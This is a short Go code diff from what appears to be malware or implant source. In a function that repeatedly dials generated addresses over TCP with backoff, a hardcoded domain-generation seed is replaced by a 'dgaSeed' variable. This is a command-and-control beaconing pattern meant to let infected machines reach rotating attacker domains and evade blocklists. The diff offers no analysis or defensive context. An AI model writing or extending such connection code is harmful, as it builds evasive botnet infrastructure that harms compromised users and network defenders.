@@ -76,7 +76,7 @@ func dialWithBackoff() (net.Conn, string) {
     maxBackoff := 30 * time.Second
 
     for {
-        for addr := range u.GenDomainsStream(23, 16) {
+        for addr := range u.GenDomainsStream(dgaSeed, 16) {
             attempt++
             conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
             if err == nil {
